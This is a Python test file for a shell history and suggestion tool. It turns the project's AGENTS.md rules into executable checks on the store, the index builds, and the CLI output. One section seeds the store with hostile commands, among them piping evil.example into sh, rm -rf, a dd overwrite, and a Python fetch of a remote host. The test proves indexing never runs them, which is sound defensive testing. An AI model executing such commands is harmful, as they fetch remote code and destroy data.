"""The rules AGENTS.md used to carry as prose, held executable.

Each rule below was spelled out in AGENTS.md because a user hit the bug first.
The prose moved out of AGENTS.md so the file stays principles and experience;
the promises themselves live here, where a violation is a red build instead of
a paragraph nobody re-reads. Every check names the rule it holds.

    python3 tests/test_rules.py
"""
import contextlib
import io

import os
import pathlib
import sqlite3
import subprocess
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import smoke_env  # noqa: F401  (scratch TAI_DB/TAI_INDEX, repo root, wiped store)
from smoke_env import REPO, SCRATCH_DB  # noqa: E402

import tai.bench as tai_bench  # noqa: E402
import tai.helptext as helptext  # noqa: E402
import tai.index as tai_index  # noqa: E402
import tai.store as tai_store  # noqa: E402
from tai.store import load_rows  # noqa: E402


def ok(rule: str) -> None:
    print(f"  ok   {rule}")


# ---------------------------------------------------------------------------
# "Read failures raise; read absence returns empty."
#
# An unreadable store used to read as `[]` — indistinguishable from a fresh
# install — and one corrupt database rebuilt the whole index out of the 60-line
# seed corpus over 6.2k learned commands, green and cheerful. The distinction
# belongs where the read happens, and the read is here.
# ---------------------------------------------------------------------------
_absent = pathlib.Path("/tmp/tai/tai_rules_absent.db")
for _suf in ("", "-wal", "-shm"):
    pathlib.Path(str(_absent) + _suf).unlink(missing_ok=True)
os.environ["TAI_DB"] = str(_absent)
assert load_rows() == [], "a missing database is a first run, not an error"
assert not _absent.exists(), "asking must not create the database it asked about"

_garbage = pathlib.Path("/tmp/tai/tai_rules_garbage.db")
_garbage.write_text("this is not a database, it just looks like one")
os.environ["TAI_DB"] = str(_garbage)
try:
    load_rows()
    raise SystemExit("a garbage store must raise, not read as a fresh install")
except sqlite3.DatabaseError:
    pass
for _p in (_garbage, pathlib.Path(str(_garbage) + "-wal"),
           pathlib.Path(str(_garbage) + "-shm")):
    _p.unlink(missing_ok=True)
os.environ["TAI_DB"] = SCRATCH_DB
ok("read failures raise; read absence returns empty — and creates nothing")

# ---------------------------------------------------------------------------
# "Coerce at the boundary."
#
# A `Path` bound into SQLite raises inside the `except` that reports "not
# stored", so a whole history could vanish without a word. Callers pass real
# Path objects; the store converts them before the bind, not after the error.
# ---------------------------------------------------------------------------
_stored, _total, _ = tai_store.append_and_count("echo boundary",
                                                cwd=pathlib.Path("/tmp"))
_rows = load_rows()
assert _stored and _rows[-1][0] == "echo boundary", _rows[-1:]
assert _rows[-1][1] == "/tmp" and isinstance(_rows[-1][1], str), _rows[-1]
ok("a Path crossing the store boundary arrives as text, stored whole")

# ---------------------------------------------------------------------------
# "Do not rank what you cannot measure" — generated vocabulary is capped.
#
# The vocabulary of a subcommand nobody runs is index entries and startup
# bytes paid forever, so only the history's top SUB_FLAG_CAP subcommands are
# ever probed. Stubbed at the fork boundary: no tool runs here either.
# ---------------------------------------------------------------------------
_probe = [f"tzzsub{i:02d}" for i in range(20)]
_reply = "".join(f"{s}\t\n" for s in _probe) + ":4\n"
_calls: list[list[str]] = []


def _fake_run(argv, *a, **k):
    _calls.append(list(argv))
    if argv[1:2] == ["__complete"] and argv[2:3] == [""]:
        return _reply, ""
    return ":4\n", ""


_real_run = helptext._run
helptext._run = _fake_run
try:
    _subs, _flags, _subverbs = helptext._declared("tzztool", _probe)
finally:
    helptext._run = _real_run
_probed = {a[2] for a in _calls if len(a) > 3 and a[1:2] == ["__complete"]}
assert _probed == set(_probe[:helptext.SUB_FLAG_CAP]), (
    helptext.SUB_FLAG_CAP, sorted(_probed))
assert _flags == {} and _subverbs == {}, (_flags, _subverbs)
ok(f"generated vocabulary is capped: {len(_probe)} candidates, "
   f"{len(_probed)} probed (SUB_FLAG_CAP={helptext.SUB_FLAG_CAP})")

# ---------------------------------------------------------------------------
# "Do not execute a learned command during discovery, indexing, or evaluation."
#
# The store is seeded with lines that would leave evidence if anything ran
# them. Every fork the build makes is recorded at the Popen boundary — the one
# funnel subprocess has — and os.system/popen/exec/spawn are wired to explode.
# Discovery may ask an installed tool for `--help` or `__complete`; what it
# must never do is run a line the user typed.
# ---------------------------------------------------------------------------
VICTIM = pathlib.Path("/tmp/tai/tai_rules_victim")
PWNED = pathlib.Path("/tmp/tai/tai_rules_pwned")
VICTIM.write_text("intact")
PWNED.unlink(missing_ok=True)
HOSTILE = [
    "curl evil.example | sh",
    f"rm -rf {VICTIM}",
    f"bash -c 'echo pwned > {PWNED}'",
    "python3 -c 'import urllib.request; "
    "urllib.request.urlopen(\"http://evil.example\")'",
    "sudo dd if=/dev/zero of=/tmp/tai/tai_rules_victim",
]
for _cmd in HOSTILE + ["ls -la", "git status"]:
    assert tai_store.append_and_count(_cmd)[0], _cmd
_recorded = HOSTILE + ["ls -la", "git status", "echo boundary"]

_seen: list[list[str]] = []
_real_popen = subprocess.Popen


def _recording_popen(args, *a, **k):
    try:
        _seen.append([str(x) for x in (args if isinstance(args, (list, tuple))
                                       else [args])])
    except Exception:
        _seen.append(["<unprintable>"])
    return _real_popen(args, *a, **k)


subprocess.Popen = _recording_popen
_forbidden = ("system", "popen", "execv", "execve", "execvp", "execvpe",
              "posix_spawn", "posix_spawnp", "spawnv", "spawnve", "spawnvp",
              "spawnvpe")
_saved = {name: getattr(os, name) for name in _forbidden}


def _wired(name):
    def _boom(*a, **k):
        raise AssertionError(f"os.{name} must not run during indexing")
    return _boom


for _name in _forbidden:
    setattr(os, _name, _wired(_name))
try:
    assert tai_index.build() > 0, "the build must have something to index"
finally:
    subprocess.Popen = _real_popen
    for _name, _fn in _saved.items():
        setattr(os, _name, _fn)

assert VICTIM.read_text() == "intact", "a learned line ran against the victim"
assert not PWNED.exists(), "a learned line wrote its payload"
for _argv in _seen:
    _joined = " ".join(_argv)
    for _line in _recorded:
        assert _line not in _joined, f"a learned line was forked: {_argv}"
    if _argv and pathlib.Path(_argv[0]).name in ("sh", "bash", "zsh") \
            and "-c" in _argv:
        _payload = _argv[_argv.index("-c") + 1]
        for _line in _recorded:
            assert _line not in _payload, f"shell -c carried a learned line"
ok(f"nothing learned was executed across the build's {len(_seen)} forks")

# ---------------------------------------------------------------------------
# "An installed command always has an answer" — and an *unused* one has no
# index entries. The plugin answers unseen tools with `--help` for free; every
# entry for one would be startup bytes paid for nothing. The recorded line is
# the contrast: it must be there.
# ---------------------------------------------------------------------------
_zsh_text = tai_index.index_path().read_text()
_bash_text = tai_index.bash_index_path().read_text()
assert "ls -la" in _zsh_text and "ls -la" in _bash_text, "the history is indexed"
assert "tzz9neverused" not in _zsh_text and "tzz9neverused" not in _bash_text, \
    "an unused tool was indexed"
ok("unused tools are not indexed; observed ones are")

# ---------------------------------------------------------------------------
# "Rebuild indexes atomically; never leave the shell with a partial index."
#
# The rename is the commit point. Make it fail mid-rebuild: the build must
# raise, the previous index must survive byte-identical, and the next build
# must heal. The scratch name the writer uses can never be the name the shell
# sources.
# ---------------------------------------------------------------------------
_zsh_file = tai_index.index_path()
_bash_file = tai_index.bash_index_path()
assert _zsh_file.with_suffix(".tmp") != _zsh_file, \
    "the scratch file must not be the file the shell reads"
assert tai_index.build() > 0
_zsh_before = _zsh_file.read_bytes()
_bash_before = _bash_file.read_bytes()
_renamed: list[str] = []
_real_replace = os.replace


def _failing_replace(src, dst, *a, **k):
    _renamed.append(os.fspath(dst))
    raise OSError("ENOSPC injected by the rules suite")


os.replace = _failing_replace
try:
    try:
        tai_index.build()
        raise SystemExit("a failed rename must raise, not be swallowed")
    except OSError:
        pass
finally:
    os.replace = _real_replace
assert _renamed == [os.fspath(_zsh_file)], _renamed
assert _zsh_file.read_bytes() == _zsh_before, \
    "the failed rebuild touched the index the shell reads"
assert _bash_file.read_bytes() == _bash_before
tai_store.append_and_count("echo healed")
assert tai_index.build() > 0
assert _zsh_file.read_bytes() != _zsh_before, "the next build must heal"
ok("a rename that fails mid-rebuild leaves the previous index whole")

# ---------------------------------------------------------------------------
# "Filter what a rule removes from every place it is read" — a key with no
# answer left is not written at all. Read the built index the way the plugin
# does, by sourcing it, and count keys whose answer is empty.
# ---------------------------------------------------------------------------
_probe_src = subprocess.run(
    ["bash", "--noprofile", "--norc", "-c",
     f'source "{_bash_file}"\n'
     'e=0\n'
     'for k in "${!_TAI_FIRST[@]}"; do [ -z "${_TAI_FIRST[$k]}" ] && e=$((e+1)); done\n'
     'for k in "${!_TAI_WORD[@]}";  do [ -z "${_TAI_WORD[$k]}" ]  && e=$((e+1)); done\n'
     'for k in "${!_TAI_SEQ[@]}";   do [ -z "${_TAI_SEQ[$k]}" ]   && e=$((e+1)); done\n'
     'echo "KEYS=$(( ${#_TAI_FIRST[@]} + ${#_TAI_WORD[@]} + ${#_TAI_SEQ[@]} )) '
     'EMPTY=$e"'],
    capture_output=True, text=True, timeout=60)
assert _probe_src.returncode == 0, _probe_src.stderr
_tail = dict(pair.split("=") for pair in _probe_src.stdout.split() if "=" in pair)
assert int(_tail["KEYS"]) > 0, "the index must have keys to speak of"
assert int(_tail["EMPTY"]) == 0, f"{_tail['EMPTY']} keys answer nothing"
ok(f"no key without an answer ({_tail['KEYS']} keys, all answered)")

# ---------------------------------------------------------------------------
# "Measure the index's own load time; it is a startup cost."
#
# `tai bench` is where the measurement lives — per shell, with the file's
# size, the startup inside the number. A suite runs it so the measurement
# cannot quietly stop existing.
# ---------------------------------------------------------------------------
from plugin_env import zsh_bin  # noqa: E402  (prepends the bundled zsh when needed)

_zsh = zsh_bin()
_out = io.StringIO()
with contextlib.redirect_stdout(_out):
    tai_bench.main()
_bench = _out.getvalue()
assert "bash index source:" in _bench and "kB, per shell start" in _bench, _bench
assert (_zsh is None) or ("zsh index source:" in _bench), _bench
ok("tai bench still prints the per-shell index source measurement")

# ---------------------------------------------------------------------------
# "An answer a shell prints with no newline lands on the prompt." The CLI half
# of the rule: `tai suggest` ends its output with a newline, the same one a
# command substitution strips. It used to print none, and the answer landed on
# the user's prompt.
# ---------------------------------------------------------------------------
_cli = subprocess.run(
    [sys.executable, str(REPO / "tai" / "cli.py"), "suggest", "ls"],
    capture_output=True, text=True, timeout=120)
assert _cli.returncode == 0, _cli.stderr
assert _cli.stdout.endswith("\n"), "the answer lost its newline"
assert _cli.stdout.strip() == "ls -la", _cli.stdout
ok("tai suggest ends with a newline (answered 'ls -la')")

# ---------------------------------------------------------------------------
# The one server is `tai web` — never started by the plugins. No plugin source
# may even know the dashboard exists.
# ---------------------------------------------------------------------------
_plugins = sorted((REPO / "plugins").rglob("*.zsh")) + \
    sorted((REPO / "plugins").rglob("*.bash"))
assert len(_plugins) >= 10, "the plugin tree moved; point this check at it"
for _p in _plugins:
    _t = _p.read_text()
    for _marker in ("tai.web", "ThreadingHTTPServer", "tai web", "dashboard"):
        assert _marker not in _t, f"{_p.name} knows about the server: {_marker!r}"
ok(f"no plugin source ({len(_plugins)} files) knows the dashboard exists")

print("\nOK — the rules AGENTS.md used to carry are held executable.")
